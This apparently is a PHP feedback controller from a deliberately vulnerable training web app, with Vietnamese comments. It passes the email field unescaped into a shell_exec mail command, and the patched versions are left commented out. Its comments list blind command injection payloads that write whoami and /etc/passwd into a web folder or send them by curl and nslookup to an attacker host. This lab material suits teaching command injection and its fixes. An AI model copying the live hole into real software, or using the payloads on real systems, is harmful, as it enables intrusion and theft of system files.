<?php
class FeedbackController {
    public function index() {
        require_once 'app/views/feedback.php';
    }

    public function send() {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $name = $_POST['name'] ?? '';
            $email = $_POST['email'] ?? '';
            $message = $_POST['message'] ?? '';
            
            // ╔════════════════════════════════════════════════════════════════╗
            // ║  KỊCH BẢN 2 & 3: BLIND COMMAND INJECTION                     ║
            // ║  - KB2: OUTPUT REDIRECTION (Ghi file → đọc qua /image)       ║
            // ║  - KB3: OUT-OF-BAND EXFILTRATION (Gửi data ra Kali)         ║
            // ╚════════════════════════════════════════════════════════════════╝
            
            // LỖ HỔNG 1: KHÔNG SANITIZE EMAIL INPUT
            // Email từ user được dùng trực tiếp mà không validate
            // Attacker có thể inject command thông qua field email
            
            // LỖ HỔNG 2: CONCATENATE INPUT VÀO SHELL COMMAND
            // Giả lập gửi email notification bằng lệnh mail
            // Email được nối trực tiếp KHÔNG CÓ QUOTES bao quanh
            
            // ═════════════════════════════════════════════════════════════
            // CODE LỖ HỔNG (ĐANG BẬT) - Comment 2 dòng dưới để tắt
            // ═════════════════════════════════════════════════════════════
            $command = "mail -s Feedback -r " . $email . " admin@cybershop.com";
            $output = shell_exec($command);
            
            // ╔═════════════════════════════════════════════════════════╗
            // ║ CODE VÁ (ĐANG TẮT) - Uncomment 1 trong 2 cách dưới     ║
            // ╚═════════════════════════════════════════════════════════╝
            
            // CÁCH 1: filter_var() + escapeshellarg() - Nhanh ✅
            //if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            //    header("Location: /result?msg=invalid_email");
            //    exit;
            //}
            //$command = "mail -s Feedback -r " . escapeshellarg($email) . " admin@cybershop.com";
            //$output = shell_exec($command);
            
            // CÁCH 2: Whitelist domains - An toàn hơn ✅✅
            //$allowedDomains = ['gmail.com', 'yahoo.com', 'outlook.com'];
            //$emailDomain = substr(strrchr($email, "@"), 1);
            //if (!in_array($emailDomain, $allowedDomains)) {
            //    header("Location: /result?msg=invalid_domain");
            //    exit;
            //}
            //$command = "mail -s Feedback -r " . escapeshellarg($email) . " admin@cybershop.com";
            //$output = shell_exec($command);
            
            // LỖ HỔNG 3: KHÔNG TRẢ OUTPUT (BLIND)
            // Response KHÔNG chứa kết quả lệnh
            // → Attacker KHÔNG thấy output trực tiếp
            // → Phải dùng kỹ thuật: Output Redirection hoặc OOB
            
            // ╔═══════════════════════════════════════════════════════════╗
            // ║  KỊCH BẢN 2: OUTPUT REDIRECTION                           ║
            // ╠═══════════════════════════════════════════════════════════╣
            // ║  Ghi output vào file → đọc qua /image endpoint            ║
            // ║                                                            ║
            // ║  email=a||whoami>/var/www/images/output.txt||b            ║
            // ║  → Đọc qua: http://192.168.11.19/image?filename=output.txt║
            // ║                                                            ║
            // ║  email=a||cat /etc/passwd>/var/www/images/pwd.txt||b      ║
            // ║  → Đọc qua: http://192.168.11.19/image?filename=pwd.txt   ║
            // ╚═══════════════════════════════════════════════════════════╝
            
            // ╔═══════════════════════════════════════════════════════════╗
            // ║  KỊCH BẢN 3: OUT-OF-BAND (OOB) EXFILTRATION              ║
            // ╠═══════════════════════════════════════════════════════════╣
            // ║  Gửi data RA NGOÀI đến Kali Linux (192.168.11.21)        ║
            // ║                                                            ║
            // ║  HTTP EXFILTRATION:                                       ║
            // ║  email=a||curl http://192.168.11.21:8000/?d=`whoami`||b   ║
            // ║  → Kali nghe: python3 -m http.server 8000                 ║
            // ║  → Log: GET /?d=www-data                                  ║
            // ║                                                            ║
            // ║  POST EXFILTRATION:                                       ║
            // ║  email=a||curl -d "`cat /etc/passwd`" http://192.168.11.21:8000||b║
            // ║  → Gửi toàn bộ file content qua POST                      ║
            // ║                                                            ║
            // ║  DNS EXFILTRATION (nếu HTTP bị block):                    ║
            // ║  email=a||nslookup `whoami`.192.168.11.21.nip.io||b       ║
            // ║  → Kali nghe: sudo tcpdump -i any port 53                 ║
            // ╚═══════════════════════════════════════════════════════════╝
            
            // Giả lập xử lý thành công (lưu log, database...)
            // Không có output về command injection
            
            // Chuyển hướng sang trang thông báo (Blind - không thấy output)
            header("Location: /result?msg=success");
            exit;
        }
    }
}
?>